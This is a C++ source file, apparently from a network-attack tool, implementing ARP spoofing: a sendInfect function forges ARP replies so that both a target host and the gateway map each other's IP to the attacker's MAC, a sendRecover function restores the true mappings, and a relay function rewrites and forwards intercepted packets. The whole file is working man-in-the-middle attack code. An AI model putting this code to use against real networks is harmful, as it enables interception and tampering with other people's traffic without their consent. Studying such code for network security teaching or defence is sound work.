#include "arpspoof.h"
void Arpspoof::sendInfect(Flow flow)
{
    spdlog::info(string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = intf_->mac_;
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    device_.write(Buf(pbyte(&packet), sizeof(packet)));

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    device_.write(Buf(pbyte(&packet), sizeof(packet)));
}

void Arpspoof::sendRecover(Flow flow)
{
    spdlog::info(std::string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = Mac::nullMac();
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->smac_ = flow.mac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    device_.write(Buf(pbyte(&packet), sizeof(packet)));

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->smac_ = gatewayMac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    device_.write(Buf(pbyte(&packet), sizeof(packet)));
}

Packet::Result Arpspoof::relay(Packet* packet) {
    packet->ethHdr_->smac_ = intf_->mac_;
    return write(packet);
}
